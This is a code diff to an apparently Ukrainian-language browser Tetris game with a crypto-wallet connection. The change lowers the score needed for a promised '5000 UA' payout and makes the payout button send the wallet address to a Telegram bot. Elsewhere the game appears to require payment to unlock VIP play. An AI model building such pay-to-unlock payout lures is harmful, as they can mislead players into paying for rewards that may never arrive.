@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>UA TETRIS 🗿</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { background: #111; color: white; display: flex; flex-direction: column; align-items: center; font-family: sans-serif; margin: 0; padding: 5px; touch-action: none; overflow: hidden; height: 100vh; }
         #ton-connect-button { margin-bottom: 6px; min-height: 40px; width: 100%; display: flex; justify-content: center; z-index: 100; }
@@ -17,7 +16,7 @@
         .info-label { font-size: 8px; color: #ffd700; text-transform: uppercase; margin-bottom: 2px; display: block; }
         .info-value { font-size: 14px; font-weight: bold; color: #ffd700; }
 
-        #winButton { display: none; background: #28a745; color: white; width: 280px; padding: 12px; border-radius: 8px; border: none; font-weight: bold; margin-bottom: 6px; cursor: pointer; animation: pulse 1.5s infinite; z-index: 101; }
+        #winButton { display: none; width: 280px; padding: 10px; border-radius: 8px; text-decoration: none; font-weight: bold; font-size: 13px; margin-bottom: 6px; text-align: center; background: #28a745; color: white; border: none; cursor: pointer; animation: pulse 1.5s infinite; z-index: 101; box-sizing: border-box; }
         @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
 
         .score-panel { display: flex; align-items: center; gap: 6px; margin-bottom: 6px; }
@@ -52,7 +51,7 @@
         </div>
     </div>
 
-    <button id="winButton" onclick="sendToTelegram()">💰 ВИВЕСТИ 5000 UA</button>
+    <a id="winButton" href="#" target="_blank">💰 ВИВЕСТИ 5000 UA</a>
 
     <div class="score-panel">
         <div class="side-btn" onclick="toggleSound()" id="soundBtn">🔊</div>
@@ -109,16 +108,11 @@
             } catch(e) {}
         }
 
-        function sendToTelegram() {
+        function updateTelegramLink() {
             const wallet = tonConnectUI.account ? tonConnectUI.account.address : "Не підключено";
             const text = `ЗАЯВКА НА ВИПЛАТУ:%0A🎮 Гра: UA TETRIS 🗿%0A💰 Сума: 5000 UA%0A👛 Гаманець: ${wallet}`;
-            const url = `https://t.me/uatokenkrypta?text=${text}`;
-            
-            if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.openTelegramLink) {
-                window.Telegram.WebApp.openTelegramLink(url);
-            } else {
-                window.open(url, '_blank');
-            }
+            const btn = document.getElementById('winButton');
+            btn.href = `https://t.me/tokenpist_bot?text=${text}`;
         }
 
         const canvas = document.getElementById('tetris');
@@ -230,7 +224,8 @@
                 document.getElementById('unlockBox').style.display = 'flex';
                 playTone(800, 'triangle', 0.4);
             }
-            if (player.score >= 100 && isVip) {
+            if (player.score >= 40 && isVip) {
+                updateTelegramLink();
                 document.getElementById('winButton').style.display = 'block';
             }
         }
@@ -319,7 +314,7 @@
         }
 
         function showRules() { 
-            alert('Збирайте очки! На 20 очках — розблокування, на 100 — виплата 5000 UA!'); 
+            alert('Збирайте очки! На 20 очках — розблокування, на 40 — виплата 5000 UA!'); 
         }
 
         async function payAndContinue() {
